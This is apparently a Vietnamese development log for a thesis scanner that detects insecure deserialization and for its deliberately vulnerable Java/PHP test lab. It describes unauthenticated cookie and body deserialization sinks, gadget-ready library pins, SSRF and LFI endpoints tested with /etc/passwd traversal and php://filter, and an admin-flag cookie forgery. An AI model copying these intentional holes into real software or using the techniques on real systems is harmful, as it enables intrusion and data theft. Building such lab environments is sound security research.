  **Endpoint mới**: `POST /api/integration/receive` ([MessageIntegrationController.java](../Web vul env/java-app/src/main/java/com/webvulenv/javaapp/controller/MessageIntegrationController.java)) — đọc `Content-Type`, nếu đúng `application/x-java-serialized-object` thì đọc RAW body qua `StreamUtils.copyToByteArray()` (dùng tiện ích CÓ SẴN của Spring, không thêm dependency, tránh lỗi Java 8 không có `InputStream.readAllBytes()` của Java 9+) rồi `ObjectInputStream.readObject()` TRỰC TIẾP — không qua `SessionCookieFilter` (chỉ guard `/api/dashboard`/`/api/profile`), nên không cần cookie/login — đúng khớp "lack of authentication required" của CVE thật.

  **Verify thật đầy đủ cả 3 case qua Docker**:
  1. `Content-Type` sai → **415**, báo lỗi rõ, không chạm tới deserialize.
  2. `Content-Type` đúng + byte rác → **500**, lộ đúng `"failed to deserialize message body via ObjectInputStream: java.io.StreamCorruptedException..."` — khớp `ERROR_KEYWORDS`.
  3. `Content-Type` đúng + **byte Java serialize THẬT** (tự tay dựng hex `ac ed 00 05 74 00 05 68 65 6c 6c 6f` = serialize chuẩn của `String "hello"`, không qua tool nào, dựa theo định dạng byte cố định đã biết của Java serialization cho kiểu String) → **200**, `{"receivedType":"java.lang.String","success":true}` — xác nhận deserialize THẬT hoạt động đúng, không chỉ test case lỗi.
  - Re-verify endpoint cũ (`/login`, `/api/dashboard`) không bị ảnh hưởng gì.

-32. **[FIXED — nhất quán kiến trúc]** User chỉ ra đúng: Java hardcode `NOTIFICATIONS` thẳng trong `PortalApiController.java`, PHP đọc từ `data/notifications.json` — KHÔNG nhất quán, khó debug/maintain sau này ("ưu tiên clean code, chứ code bừa rồi không nhất quán thì làm gì dễ debug"). Fix: tạo `java-app/src/main/resources/notifications.json` (y hệt nội dung PHP) + `NotificationService.java` mới (đọc file qua Jackson, CÙNG pattern với `UserService.java` đã có — Controller → Service → data file, không rẽ ra cách riêng). `PortalApiController` inject `NotificationService` qua constructor, bỏ hẳn list hardcode + helper `notif()`.

  **Verify thật** (lần này ĐỔI LOGIC thật, không như xoá comment trước — phải test): `docker build` → `BUILD SUCCESS`; `GET /api/notifications` → đúng 3 notification từ file JSON (không còn từ code); login+dashboard vẫn hoạt động đúng, không bị ảnh hưởng.

-31. **[NÂNG CẤP + DỌN DẸP — repo `Web_vul_env`]** Theo yêu cầu "làm cho môi trường test trông giống thật hơn đi, build thêm nhiều api, chức năng" — thêm loạt feature/API mới cho CẢ 2 app (profile/settings/notifications) + 2 field "noise" (benign, không deserialize — test false-positive) + 2 endpoint wrapper mới cho PHP (SSRF/LFI) đã bàn ở câu hỏi coverage trước đó. Sau đó theo yêu cầu "delete tất cả comment trong code đi" — xoá sạch comment ở TOÀN BỘ project (7 file Java, 11 file PHP, 2 file HTML/JS), chỉ xoá `//`/`/** */`/`<!-- -->`, không đổi logic — không rebuild/test lại (comment không ảnh hưởng runtime, user tự chỉ ra việc test là dư thừa).

  **Feature mới (cả 2 app)**:
  - `GET /api/profile` (Java)/`profile.php` (PHP) — trả username/email/joined + 2 field noise.
  - `POST /api/settings` — set cookie `prefs` (JSON benign, theme/lang) — KHÔNG BAO GIỜ deserialize.
  - `GET /api/notifications` — list tĩnh, không tham số, không lỗ hổng — tăng độ "giống app thật".
  - FE: thêm `profile.html`, cập nhật `dashboard.html` (nav Profile, khối notification, settings theme) — JS tự set cookie `ref_tag` (mô phỏng tracking referral thật) lúc load trang.

  **2 field "noise" — test false-positive** (đã bàn ở câu hỏi "có gì make noise để test không"):
  1. `prefs` — JSON thường, không phải object injection, chỉ server echo lại.
  2. `ref_tag` — CỐ TÌNH có shape giống serialize (`O:3:"Tag":1:{...}`) nhưng KHÔNG BAO GIỜ bị `unserialize()`/`ObjectInputStream` — chỉ echo literal. Detector đúng phải báo tối đa "Suspected", KHÔNG được "Confirmed".

  **2 endpoint wrapper mới (chỉ PHP, vì tool chỉ có `_mutate_wrapper_*` cho PHP)**:
  - `GET /api/preview.php?url=...` — SSRF thật (`file_get_contents($url)` không allowlist).
  - `GET /api/document.php?file=...` — LFI thật (`file_get_contents($file)` không containment check) — test được `file://`, `php://filter`, path traversal.

  **3 bug thật tự bắt được lúc verify** (trước khi xoá comment):
  1. Dockerfile PHP thiếu `COPY data ./data` (đã fix ở mục -28, nhắc lại context).
  2. `document.php` lỗi "No such file" dùng path `documents/welcome.txt` — nguyên nhân: **PHP built-in server set CWD = thư mục của SCRIPT đang chạy** (`public/api/`), KHÔNG PHẢI docroot — fix: đổi default value FE + comment hint thành `../documents/welcome.txt` (đã verify đúng qua `curl`, bao gồm cả `/etc/passwd` traversal và `php://filter` source disclosure thật).
  3. `preview.php` test tự fetch chính nó (`http://localhost:8082/...`) bị treo — nguyên nhân: PHP built-in server **đơn luồng**, tự gọi mình = deadlock (request ngoài chờ fetch xong, fetch cần server rảnh để nhận request mới) — không phải bug app, chỉ là chọn URL test sai; verify lại bằng URL ngoài thật (`https://example.com`) thành công.

  **Verify đầy đủ qua Docker** (trước khi xoá comment): login/profile/settings/notifications đều đúng cho cả 2 app; `ref_tag` echo lại đúng y nguyên giá trị decoy (không bị xử lý gì); lỗ hổng gốc (admin flip, cookie rác → lộ lỗi) vẫn hoạt động 100% sau mọi thay đổi.

-30. **[MỚI — repo `Web_vul_env`]** Thêm "ý tưởng 2" đã bàn trước (terminal web gắn thật vào máy) — dùng **ttyd** (tool OSS, xterm.js + PTY thật qua WebSocket, `apt install ttyd` có sẵn trong Ubuntu repo, không cần build gì) — chạy TRONG WSL2 Ubuntu (đúng nơi có đủ Java/PHP/Ruby/.NET thật của EthicalQuoc), root tại thư mục `Thesis` qua `--cwd /mnt/d/Thesis/Thesis`.

  **2 chi tiết thật phải tự xử lý lúc cài**:
  1. `apt install ttyd` tự enable kèm 1 **systemd service** chiếm sẵn port 7681 ở mode READ-ONLY (`--writable` không set theo mặc định — chỉ XEM, không gõ lệnh được) — phải tắt service đó (`systemctl stop/disable ttyd`) rồi tự chạy lại bằng tay với `--writable` mới gõ lệnh được.
  2. WSL2 tự forward `localhost:7681` ra Windows host — verify thật bằng `curl http://localhost:7681/` từ PowerShell/Git Bash, ra 200, không cần cấu hình port-forward thủ công gì thêm.

  **Tích hợp vào control panel + `start-all.bat`**: thêm nút "Open live terminal (WSL2)" riêng (không gộp vào switch Java/PHP, vì terminal không phải "backend để chọn" mà là tiện ích phụ) trỏ `http://localhost:7681`; `start-all.bat` thêm bước `wsl -d Ubuntu -- bash -c "pkill ttyd; ... nohup ttyd -p 7681 --writable --cwd /mnt/d/Thesis/Thesis bash & disown"` — tự kill instance cũ (tránh lỗi bind port trùng) rồi chạy lại mỗi lần script khởi động.

  **Verify thật đầy đủ (chạy lại toàn bộ `start-all.bat` từ đầu)**: Docker build cả 2 image (cache đúng) → 2 container start → ttyd start trong WSL2 → `curl` xác nhận **cả 3 đều 200** (`localhost:8081`/`8082`/`7681`) → control panel tự mở, có thêm nút terminal mới.

-29. **[MỚI — repo `Web_vul_env`]** `control-panel/index.html` (trang switch Java/PHP, đã bàn ý tưởng trước — chọn hướng đơn giản: chỉ là link đổi port, không orchestration) + `start-all.bat` (file chạy 1 lần dựng toàn bộ: check/khởi động Docker Desktop nếu chưa chạy, build 2 image, chạy 2 container, mở control panel) — theo yêu cầu "tạo file bat chạy 1 lần tất cả server".

  **1 bug thật tự phát hiện lúc verify** ([start-all.bat](../Web vul env/start-all.bat)): dòng `timeout /t 5 /nobreak >nul` trong vòng chờ Docker sẵn sàng bị lỗi `"Input redirection is not supported, exiting the process immediately"` khi script chạy trong môi trường không có console input thật (non-interactive) — `timeout.exe` cần console handle thật. Fix: đổi sang `ping -n 6 127.0.0.1 >nul` (trick cổ điển sleep ~5s không cần console input).

  **Verify thật 2 lần** (lần 1 bắt lỗi timeout, lần 2 sau fix sạch): `start-all.bat` chạy xong → Docker build cả 2 image (cache lại đúng, không rebuild lại từ đầu lần 2) → cả 2 container start → `curl` xác nhận `Java: 200`/`PHP: 200` → control panel tự mở.

-28. **[ĐỔI KIẾN TRÚC — cả 2 app]** Theo làm rõ "ý tôi nói mà architecture của web ấy... FE giao tiếp qua BE thông qua API, có authen, mô hình MVC" — đổi hẳn từ server-render (Thymeleaf/PHP template) sang **REST API (JSON) + FE tĩnh gọi `fetch()`**. Dữ liệu user chuyển từ hardcode trong code sang **`users.json`** (user đề xuất: "thay vì mysql thì lưu qua json cho nhẹ nhàng") — vai trò như DB nhẹ, đọc read-only lúc login.

  **Kiến trúc mới (cả 2 app)**:
  ```
  BE (JSON REST API):
    POST /api/login     -> đọc users.json, check credential, set cookie session=Base64(serialize(...)), tra JSON
    GET  /api/dashboard -> đọc cookie, unserialize/ObjectInputStream (VAN LA SINK LO HONG CU), tra JSON
    POST/GET /api/logout -> xoá cookie
  FE (file tĩnh, KHÔNG qua server template nữa):
    login.html/dashboard.html -> JS fetch() gọi API, render DOM bằng tay
  ```
  Java: thêm `UserService`+`UserRecord` (đọc `users.json` qua Jackson, đã có sẵn trong `spring-boot-starter-web`), `AuthApiController` (`@RestController`) thay `AuthController` (Thymeleaf) đã xoá hẳn + bỏ dependency `spring-boot-starter-thymeleaf` khỏi `pom.xml`. `SessionCookieFilter` đổi guard từ `/dashboard` sang `/api/dashboard`, trả JSON lỗi thay vì redirect/HTML.
  PHP: thêm `data/users.json`, 3 file `public/api/{login,logout,dashboard}.php` (JSON in/out) thay hẳn `login.php`/`dashboard.php`/`logout.php` cũ.

  **Lợi ích phụ**: giải quyết luôn câu hỏi trước "sao DevTools không thấy API" — giờ Network tab thấy đúng request `fetch()` tới `/api/*`, request/response JSON rõ ràng.

  **1 bug thật tự phát hiện lúc build+test** ([php-app/Dockerfile](../Web vul env/php-app/Dockerfile)): `COPY src ./src` + `COPY public ./public` nhưng **THIẾU `COPY data ./data`** — `api/login.php` không tìm thấy `users.json` trong container, PHP tự in `Warning: file_get_contents(...): failed to open stream` lẫn vào response JSON (không phải lỗi cố ý, là bug thật của chính lúc viết Dockerfile). Verify tay bắt được qua `curl` test login — thấy HTML warning lẫn trong response. Fix: thêm dòng `COPY data ./data`, rebuild, verify lại sạch — không còn warning.

  **Verify đầy đủ sau khi đổi kiến trúc** (cả 2 app, qua Docker thật):
  - Login API sai pass → `401 {"error":"Invalid username or password."}`.
  - Login API đúng pass (`wiener`/`peter`) → `200`, `Set-Cookie: session=...` (vẫn đúng base64 serialize thật), JSON `{"success":true,...}`.
  - Dashboard API với cookie thật → JSON đúng `{"username":"wiener","role":"user"}`.
  - **Lỗ hổng vẫn nguyên**: PHP admin flip (`b:1`) → JSON `{"role":"admin"}` đúng; cookie rác cả 2 app → JSON lộ đúng lỗi deserialize, status 500 — khớp `ERROR_KEYWORDS`.
  - FE tĩnh (`login.html`/`dashboard.html`) load được 200, không qua server template nào.

  **Endpoint test EthicalQuoc đổi theo** (vẫn `location=cookie`, `name=session`): Java `url=http://localhost:8081/api/dashboard`; PHP `url=http://localhost:8082/api/dashboard.php`.

-27. **[NÂNG CẤP — cả 2 app]** Theo phản hồi "mình test thì ít nhiều cái web cũng phải giống thật xíu chứ nhờ" — thêm cho cả Java/PHP: (1) kiểm tra đăng nhập THẬT (tài khoản test cứng `wiener`/`peter` — lấy đúng cặp username/password PortSwigger hay dùng — sai thì bị từ chối, không phải gõ gì cũng vào được như bản cũ); (2) `logout` xoá cookie; (3) UI polish (brand "ACME PORTAL", nav bar, vài khối thống kê giả trên dashboard).

  **Verify đầy đủ sau khi sửa (không chỉ đổi UI mà quên test lại cơ chế lỗ hổng)**:
  - Sai password → bị chặn, hiện "Invalid username or password" (cả 2 app).
  - Đúng password (`wiener`/`peter`) → cookie serialize thật vẫn sinh đúng, dashboard hiện "Welcome back, wiener" đúng.
  - `logout` → cookie bị xoá (`Max-Age=0`/`expires` quá khứ), redirect về login.
  - **Cơ chế lỗ hổng KHÔNG bị ảnh hưởng**: PHP admin flip (`b:1`) vẫn hiện badge ADMIN đúng; cookie rác vẫn lộ đúng lỗi `unserialize()`/`StreamCorruptedException` ở cả 2 app, status 500 — xác nhận sửa UI không vô tình che/đổi hành vi deserialize.

-26. **[MỚI — repo `Web_vul_env`]** Dựng xong app PHP thứ 2, theo yêu cầu "thêm cái php cho tôi" — cùng pattern BE+FE như app Java (mục -25).

  **Stack**: PHP 7.4 (built-in dev server, không framework) + `monolog/monolog:^1.4` qua Composer (resolve ra `1.27.1`) — **không dùng logging thật**, chỉ cần có mặt trong `vendor/` để gadget `Monolog/RCE1` của `phpggc` có class thật để gọi vào lúc `unserialize()`.

  **Điểm nhất quán đặc biệt**: class `User {username, admin}` ([src/User.php](../Web vul env/php-app/src/User.php)) chọn ĐÚNG shape giống `result1.json` (data thật PortSwigger đã dùng xuyên suốt phiên: `O:4:"User":2:{s:8:"username";...;s:5:"admin";b:0;}`) — nên mutation `flip_boolean` của tool áp dụng được NGUYÊN VẸN, không cần đổi gì.

  **Verify THẬT qua Docker** (cùng máy, Docker Desktop lại tắt, tự khởi động lại):
  - `docker build` → thành công, Monolog resolve `1.27.1`.
  - `GET /login.php` → 200. `GET /dashboard.php` không cookie → 302 (baseline).
  - `POST /login.php` (username=wiener) → `Set-Cookie: session=Tzo0OiJVc2VyIjoyOnt...` — decode base64 ra ĐÚNG `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}` — khớp 100% shape thật.
  - **Test leo quyền thật**: tự tạo cookie `admin;b:1` (mô phỏng đúng mutation `flip_boolean`) → dashboard hiện badge **ADMIN** — xác nhận lỗ hổng privilege escalation qua deserialize hoạt động đúng.
  - Cookie rác (malformed) → **500**, lộ đúng `"unserialize(): Error at offset 0 of 9 bytes"` — khớp `ERROR_KEYWORDS` (`"unserialize()"`).

  **Endpoint dùng để test EthicalQuoc**: `location=cookie`, `name=session`, `url=http://localhost:8082/dashboard.php`, `method=GET`.

  **Chưa commit** — cùng trạng thái untracked như app Java, user tự quyết định khi push.

-25. **[MỚI — repo `Web_vul_env`, không phải Thesis-v2]** Dựng xong app Java đầu tiên cho môi trường test, theo yêu cầu "dựng cho tôi 1 web test java cơ bản trước đi, có BE,FE chuẩn chỉnh" — đổi thứ tự ưu tiên so với đề xuất ban đầu ở mục -22 (Java lên trước, không phải pickle/YAML).

  **Stack**: Spring Boot 2.7.18 + Thymeleaf (BE+FE monolith, server-render) + Java 8 + `commons-collections:3.2.1` pin cứng. Chọn Java 8 vì gadget `CommonsCollections` kinh điển kém ổn định trên Java 9+ (module system đổi), chọn commons-collections 3.2.1 vì đúng version CC1/CC4/CC6 cần có trên classpath mới có đường gọi reflection hợp lệ.

  **Cấu trúc** (`Web_vul_env/java-app/`): `AuthController` (login form FE + `POST /login` set cookie `session=Base64(Java-serialize(UserSession))`), `SessionCookieFilter` (chặn mọi request `/dashboard`, đọc cookie, gọi `ObjectInputStream.readObject()` TRỰC TIẾP — không allowlist, không HMAC — đúng sink mà `_mutate_java()`/ysoserial nhắm tới), `dashboard`/`login` Thymeleaf template.

  **Verify THẬT qua Docker** (Docker Desktop lúc đầu chưa chạy, tự khởi động lại rồi build):
  - `docker build` → `BUILD SUCCESS`.
  - `GET /login` → 200 (form FE load được).
  - `GET /dashboard` KHÔNG cookie (baseline) → **302** redirect `/login`.
  - `POST /login` (username=wiener) → `Set-Cookie: session=rO0AB...` — xác nhận **`rO0A` = base64 của magic byte Java serialization thật** (`ac ed 00 05`), không phải giả.
  - `GET /dashboard` VỚI cookie thật → 200, hiển thị đúng "Welcome, wiener / Role: user".
  - `GET /dashboard` với cookie RÁC (giả lập payload malformed) → **500**, body lộ đúng `"failed to deserialize session via ObjectInputStream: java.io.StreamCorruptedException..."` — khớp `ERROR_KEYWORDS` của `replay_request.py` (`"objectinputstream"`), đúng thiết kế để Stage 8 confirm được.

  **Endpoint dùng để test EthicalQuoc**: `location=cookie`, `name=session`, `url=http://localhost:8081/dashboard`, `method=GET`.

  **Chưa commit** — file đang untracked trong `Web_vul_env` (theo rule chỉ commit khi được yêu cầu), user tự quyết định khi nào push.

-24. **[REMOVED]** Bỏ hẳn `oracle_probe.py` theo quyết định của user sau khi cùng phân tích kỹ (Q&A): oracle chỉ hỗ trợ PHP (kỹ thuật "length corruption" đặc thù riêng PHP serialize — không port được sang Java/binary, Ruby/Pickle thì CÓ THỂ port nhưng chưa làm, YAML/Node/.NET cần kỹ thuật khác hẳn), VÀ kết quả của nó **không hề điều khiển gì cả** trong `main.py` (chỉ tính xong rồi đính kèm vào output, không skip mutation nào) — chi phí (thêm 2 request HTTP/vector) không bù được lợi ích hẹp (1/7 format, không gate logic).

  **Xoá**: `Replay/oracle_probe.py` (xoá file). `main.py` (bỏ import `OracleProbe`, bỏ khởi tạo `oracle = OracleProbe(replayer)`, bỏ biến `vector_info`/`normalized`/`fp_type` chỉ dùng để build oracle call, bỏ `oracle_result = oracle.probe(...)` + print, bỏ `exploit_analysis["oracle_probe"] = oracle_result`). `Utility/schemas.py` (xoá `OracleUnsupported`/`OracleNotRun`/`OracleRan`/`OracleProbeResult`, xoá field `oracle_probe: dict` khỏi `ConfirmedExploitResultExtra`). `README.md` (xoá mục "### Oracle probe", xoá dòng `oracle_probe.py` trong Project structure, xoá bullet limitation về oracle chỉ hỗ trợ PHP).

  **Verify đầy đủ**: grep `[Oo]racle` toàn bộ `.py` → 0 kết quả (xoá sạch, không sót tham chiếu). 64/64 unit test pass. mypy sạch 7 file chuẩn (giảm từ 8, vì `oracle_probe.py` không còn tồn tại để check). Full pipeline thật trên `result1.json`: `analyze`→`assess`→`report` đều exit=0, 0 traceback, **Confirmed: 0 | Suspected: 11** khớp đúng baseline cũ (lab hết hạn) — xác nhận không regression. Output `exploit_analysis` không còn key `oracle_probe` nữa (verify tay).

-23. **[CHECKPOINT]** User xác nhận "theo tôi thấy thì replay_request ok rồi" — đã học xong `Replay/replay_request.py` (Socratic Q&A: `replay()`/`_select_payload_value()`/`_reapply_encoding_chain()`/`_send()` từng dòng, kể cả 2 bug UTF-8/encoding-chain đã fix ở mục -17/-18). Verify lần cuối trước khi đóng: 64/64 unit test pass, mypy sạch. Theo kế hoạch đã note ở mục -22, bước tiếp theo là học `Replay/oracle_probe.py` (đã giải thích sơ lược trước đó — kỹ thuật "length corruption" cho PHP), rồi mới bắt tay dựng `Web_vul_env` tuần sau.

-22. **[Ý TƯỞNG — chưa làm, để tuần sau]** Kiến trúc đề xuất cho repo `Web_vul_env` (repo MỚI, tách riêng khỏi Thesis-v2, đã tạo + clone xong vào `D:\Thesis\Web vul env`, remote `lenguyenchiquoc/Web_vul_env`) — môi trường web test thật để Stage 8 (`assess`) có target sống confirm được, thay thế `result1.json` (lab PortSwigger đã hết hạn).

  **Nguyên tắc**: tự viết app TỐI THIỂU (10-20 dòng) cho mỗi ngôn ngữ, KHÔNG đi tìm app CVE có sẵn (tránh vướng version/dependency/license) — chỉ cần gọi đúng hàm deserialize trên input không kiểm soát.

  **Thứ tự ưu tiên đề xuất** (theo độ dễ + mức tool `payloadMutation.py` đã hỗ trợ sẵn):
  1. **Python pickle** — dễ nhất: Flask + `pickle.loads(base64.b64decode(request.cookies['session']))`.
  2. **YAML (Python)** — `yaml.load(value, Loader=yaml.Loader)` (unsafe loader).
  3. **PHP** — tool mature nhất (phpggc, `flip_boolean`/`modify_string`/`modify_integer` đã test kỹ): `unserialize($_COOKIE['data'])` + `composer require monolog/monolog` (khớp `PHP_GADGET_CHAINS_MAP`).
  4. **Java** — setup nặng hơn (cần pin đúng version CŨ `commons-collections:3.2.1` mới dính CC6) nhưng tool hỗ trợ tốt: servlet nhỏ `ObjectInputStream.readObject()` trên cookie.
  5. **.NET (JSON.NET)** — **phát hiện quan trọng**: KHÔNG cần Windows/ysonet — `_mutate_dotnet_jsonnet()` tự build JSON tay (dòng 808-825), target chỉ cần ASP.NET Core + `TypeNameHandling.All`, chạy Docker Linux bình thường. Minimal API: `JsonConvert.DeserializeObject<object>(body, new JsonSerializerSettings{TypeNameHandling=All})`.
  6. Node.js/Ruby — để sau, Ruby tool mới có generic Marshal (chưa gadget thật), chưa test được nhiều hơn hiện tại.

  **Điểm thiết kế quan trọng, dễ bị bỏ qua**: app lab phải để lộ lỗi thật ra response (KHÔNG tự `try/except` nuốt exception) — khớp đúng `ERROR_KEYWORDS` đã có sẵn trong `replay_request.py`. Muốn test tín hiệu TIME-BASED (`TIME_DELAY_THRESHOLD_SEC = 4.0`), cần thêm biến thể lệnh `sleep 5` cạnh `TEST_COMMANDS` hiện tại (`id`/`whoami`/`hostname`) — vì output `id` không tự nhiên xuất hiện trong response để so sánh length.

  **Cấu trúc đề xuất**:
  ```
  Web_vul_env/
  ├── docker-compose.yml       # mỗi service 1 port
  ├── pickle-app/ yaml-app/ php-app/ java-app/ dotnet-app/
  └── README.md                # ghi rõ port/endpoint/param name/location mỗi app
  ```

  **Kế hoạch user tự nêu**: tuần sau (sau 2026-10-03) mới bắt tay làm — trước đó muốn nghiên cứu kỹ thêm `replay_request.py`/`oracle_probe.py` (đang học theo kiểu Socratic cùng tôi). Chưa code gì ở repo `Web_vul_env`, chỉ mới note ý tưởng.

-21. **[MỚI]** `debug.ps1` — theo phản hồi "sao lệnh nó dài vậy, tôi nhớ ban đầu lệnh chạy wsl ngắn lắm mà" (so với `ethicalquoc.ps1` chỉ gọi `main.py`, không gọi được `debug_pipeline.py`, phải gõ nguyên câu `wsl -d Ubuntu --cd ... -- python3 debug_pipeline.py ...` dài). Tạo wrapper mới, Y HỆT pattern `ethicalquoc.ps1` (tính `$wslPath` động từ `$PSScriptRoot`, không hardcode), chỉ đổi script đích:
  ```powershell
  wsl -d Ubuntu --cd $wslPath -- python3 debug_pipeline.py @args
  ```
  Dùng: `.\debug.ps1 -i results/result1.json --step 7 -o debug_out.json`. Không gộp chung vào `ethicalquoc.ps1` (tránh thêm logic rẽ nhánh chọn script vào wrapper chính thức, giữ 2 tool tách biệt đúng vai: `ethicalquoc.ps1` = chạy tool thật, `debug.ps1` = chạy riêng tool debug nội bộ).

  **Verify thật**: `.\debug.ps1 -i results/result1.json --step 7 -o debug_out_v2.json` qua PowerShell → chạy qua WSL2 thành công, mutation `flip_boolean` ra payload THẬT (`"error" in m` = `False`), `encoding_chain: ['url', 'base64']` đúng.

-20. **[GHI CHÚ]** `debug_pipeline.py` chạy qua WSL2 (để có đủ java/php/ruby/.NET thật thay vì toàn `WinError 2` khi chạy trên shell Windows thuần, đã thấy rõ trong log paste vào). Không tạo wrapper `.ps1` riêng (tool debug nội bộ, không phải interface chính thức như `main.py`/`ethicalquoc.ps1`) — chỉ cần gọi `wsl.exe` trực tiếp, cùng cú pháp `--cd` đã dùng trong `ethicalquoc.ps1`:

  **Từ Git Bash** (bắt buộc `MSYS_NO_PATHCONV=1` — không có sẽ bị lỗi `Wsl/ERROR_PATH_NOT_FOUND` do Git Bash tự dịch sai `/mnt/d/...` thành path Windows, bug đã gặp 2 lần trước đó trong phiên, lần này gặp lại y hệt khi tự tay test):
  ```bash
  MSYS_NO_PATHCONV=1 wsl -d Ubuntu --cd /mnt/d/Thesis/Thesis -- python3 debug_pipeline.py -i results/result1.json --step 7 -o /tmp/debug_out.json
  ```

  **Từ PowerShell** (không cần `MSYS_NO_PATHCONV`, chỉ Git Bash mới bị MSYS dịch path):
  ```powershell
  wsl -d Ubuntu --cd /mnt/d/Thesis/Thesis -- python3 debug_pipeline.py -i results/result1.json --step 7 -o debug_out.json
  ```

  **Verify thật**: chạy câu lệnh Git Bash trên với `result1.json --step 7` → exit=0, mutation `flip_boolean` ra payload THẬT (`"error" in m` = `False`), `encoding_chain: ['url', 'base64']` đúng — khác hẳn chạy trên Windows thuần (toàn `WinError 2`/error dict) đã thấy ở log user paste vào trước đó.

-19. **[FIXED]** `debug_pipeline.py` — tool debug riêng (chạy pipeline dừng ở 1 stage chọn trước, không thuộc `main.py`) chưa đồng bộ theo fix "encoding_chain" ở mục -17: dòng 59-61 tạo `DataNormalizer(value).normalize()` mới mỗi lần, không giữ instance nên không gọi được `get_encoding_chain()`; dòng 84-86 build `mutation_vector` cho step 7 thiếu hẳn field `encoding_chain`. Không crash (vì `_make_payload()` dùng `.get("encoding_chain") or []`) nhưng field luôn rỗng `[]` khi debug qua tool này, khác hành vi `main.py analyze` thật — tự phát hiện lúc trả lời câu hỏi "command để chạy lệnh là gì".

  **Fix** ([debug_pipeline.py:59-61,83-88](debug_pipeline.py#L59-L88)): giữ instance `normalizer = DataNormalizer(value)`, gán `mutation_vector["encoding_chain"] = normalizer.get_encoding_chain(candidate)` giống hệt `main.py`.

  **Verify thật**: `python debug_pipeline.py -i results/result1.json --step 7 -o <file>` → exit=0, `encoding_chain: ['url', 'base64']` xuất hiện đúng trên mutation thật — khớp với kết quả `main.py analyze` đã verify ở mục -17.

-18. **[FIXED — bug thật, user tự phát hiện bằng câu hỏi "unquote hình như nó dùng utf-8, có sao ko"]** `normalize.py:_generate_decodes()` dòng `ud = urllib.parse.unquote(value)` — KHÔNG truyền `encoding`, mặc định `urllib.parse.unquote()` dùng **UTF-8** (`errors='replace'`) — cùng loại bug corrupt byte nhị phân đã sửa ở mục -17 (Bug A), nhưng lần này ở BƯỚC ĐẦU TIÊN của `normalize()`, trước cả khi dữ liệu tới Stage 7/8. Đáng chú ý: ĐÂY LÀ NHÁNH DUY NHẤT trong cả hàm `_generate_decodes()` còn dùng UTF-8 — 4 nhánh khác (`base64`/`base64_gzip`/`hex`/`jwt_segment`) đều đã chủ động dùng `latin-1` — xác nhận đây là sơ suất bỏ sót, không phải chủ ý.

  **Verify tay trước khi sửa**: byte giả lập `AC ED 00 05 FF FE` (không hợp lệ UTF-8) → percent-encode → `unquote()` mặc định → encode lại bằng latin-1 → **KHÁC byte gốc**; `unquote(..., encoding='latin-1')` → encode lại → **khớp CHÍNH XÁC** byte gốc.

  **Fix** ([normalize.py:108](Analyze/normalize.py#L108)): `urllib.parse.unquote(value)` → `urllib.parse.unquote(value, encoding='latin-1')`.

  **Verify sau fix**: 64/64 unit test pass, mypy sạch. Chạy lại toàn bộ `comprehensive.har` (158 entry) — exit=0, 0 traceback, số liệu KHÔNG đổi (`exploitable=57`, mutation=125) — xác nhận fix không ảnh hưởng case thông thường (payload text/ASCII), chỉ sửa đúng case byte nhị phân bị corrupt trước đây.

-17. **[FIXED — 2 bug thật phát hiện qua Q&A, cả 2 đã sửa xong]** Stage 8 (`assess`/`replay_request.py`) có 2 lỗ hổng khiến payload gửi đi KHÔNG KHỚP với payload Stage 7 sinh ra — cả 2 đều dẫn tới false negative âm thầm (gửi được request, không crash, nhưng target không bao giờ thấy đúng payload để deserialize).

  **Bug A — corrupt byte nhị phân qua UTF-8 lossy decode**: `_select_payload_value()` cũ dùng `base64.b64decode(...).decode("utf-8", errors="replace")` — với payload TEXT (PHP serialize/JSON/YAML) thì ổn, nhưng với payload NHỊ PHÂN THẬT (Java qua ysoserial, .NET qua ysonet — không phải UTF-8 hợp lệ), `errors="replace"` âm thầm thay byte lỗi bằng `U+FFFD`, không raise exception nên không bị `except` bắt. Verify tay: byte giả lập Java serialization (32 byte) → qua decode/encode round-trip → **40 byte, khác hoàn toàn byte gốc**.

  **Fix**: đổi toàn bộ UTF-8 (`_select_payload_value()`, và trong `_send()`: `urlencode()`/`.encode("utf-8")`) sang **latin-1** — latin-1 là bijection 1:1 với MỌI giá trị byte (0-255), decode rồi encode lại luôn ra ĐÚNG byte gốc, không như UTF-8 (chỉ round-trip đúng với byte hợp lệ UTF-8). Riêng `query`/`url_param` KHÔNG áp latin-1 cho toàn bộ `urlencode()` (sẽ vỡ nếu param KHÁC trong URL có ký tự Unicode thật ngoài phạm vi 0-255) — chỉ percent-encode ĐÚNG param đang test bằng `urllib.parse.quote(..., encoding="latin-1")`, giữ nguyên encoding mặc định cho các param không liên quan.

  **Bug B — mất lớp encoding gốc khi gửi lại (câu hỏi "b64->gzip->json thì encode lại theo đúng thứ tự không")**: `normalize()` dùng BFS lột nhiều lớp encode (base64/gzip/url/hex/jwt/json-claim) để tìm payload "có nghĩa" bên trong, nhưng trước đây CHỈ trả về chuỗi cuối cùng (`NormalizedCandidates = list[str]`, [schemas.py:22](Utility/schemas.py#L22)) — toàn bộ lịch sử "đã lột qua lớp nào, thứ tự nào" bị XOÁ SẠCH. Hệ quả: Stage 8 gửi THẲNG giá trị đã lột trần (VD PHP serialize thô) cho target, dù target thật cần `unserialize(gzinflate(base64_decode($_COOKIE[...])))` — target không bao giờ chạm được payload thật.

  **Fix** (xuyên 5 file):
  1. `normalize.py` — `_generate_decodes()` đổi return type thành `list[tuple[str,str]]` (gắn label `"url"`/`"base64"`/`"base64_gzip"`/`"hex"`/`"jwt_segment"`/`"json_claim"` cho từng phép decode); `normalize()` track thêm `self._parent_of: dict[str, tuple[str,str]]` (child → (label, parent)) lúc BFS; thêm `get_encoding_chain(candidate)` — đi ngược `_parent_of` từ candidate về root, trả list label theo đúng thứ tự NGOÀI→TRONG (thứ tự wrap gốc).
  2. `schemas.py` — thêm field `encoding_chain: list[str]` vào `MutationVector` và `MutationPayloadCore`.
  3. `main.py` — giữ instance `normalizer` (không tạo mới mỗi candidate), gắn `mutation_vector["encoding_chain"] = normalizer.get_encoding_chain(candidate)`.
  4. `payloadMutation.py` — `_make_payload()` thêm `"encoding_chain": self.vector.get("encoding_chain") or []`.
